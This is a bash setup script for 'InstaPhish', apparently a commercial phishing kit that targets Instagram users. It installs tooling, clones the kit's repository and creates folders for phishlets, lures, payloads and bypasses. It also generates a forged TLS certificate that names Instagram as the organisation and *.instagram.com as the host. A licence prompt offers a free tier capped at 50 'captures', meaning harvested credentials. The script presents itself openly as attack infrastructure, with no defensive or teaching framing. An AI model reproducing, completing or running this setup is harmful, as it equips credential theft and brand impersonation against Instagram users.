#!/bin/bash
# InstaPhish - Quick Setup Script for Termux & Kali
# Usage: bash setup.sh

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}â–ˆâ–ˆâ–ˆ InstaPhish Setup - r4tur1 â–ˆâ–ˆâ–ˆ${NC}"
echo "[*] Detecting environment..."

if [ -d "/data/data/com.termux" ]; then
    echo "[+] Termux detected"
    pkg update -y
    pkg upgrade -y
    pkg install python php openssl-tool wget curl git nmap proot -y
    pip install flask requests beautifulsoup4 selenium cryptography pyOpenSSL dnspython pysocks urllib3 colorama
else
    echo "[+] Kali Linux detected"
    sudo apt-get update -y
    sudo apt-get install python3 python3-pip php openssl wget curl git nmap -y
    pip3 install flask requests beautifulsoup4 selenium cryptography pyOpenSSL dnspython pysocks urllib3 colorama
fi

echo "[*] Cloning InstaPhish repository..."
git clone https://github.com/r4tur1/InstaPhish.git 2>/dev/null || echo "Repo exists"
cd InstaPhish

echo "[*] Setting up directory structure..."
mkdir -p phishlets certs logs lures templates payloads bypasses

echo "[*] Generating SSL certificates..."
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
    -keyout certs/instagram.key \
    -out certs/instagram.crt \
    -subj "/C=US/ST=CA/L=Menlo Park/O=Instagram/CN=*.instagram.com" \
    -addext "subjectAltName=DNS:instagram.com,DNS:*.instagram.com,DNS:*.cdninstagram.com" 2>/dev/null

echo -e "${GREEN}[+] Setup complete! Run: python3 instaphish.py${NC}"

# Monetization: License key validation (premium feature)
read -p "Enter license key for premium features (or press Enter for free tier): " LICENSE
if [ ! -z "$LICENSE" ]; then
    echo "$LICENSE" > .license
    echo "[+] Premium features unlocked"
else
    echo "[-] Running free tier (limited to 50 captures)"
fi
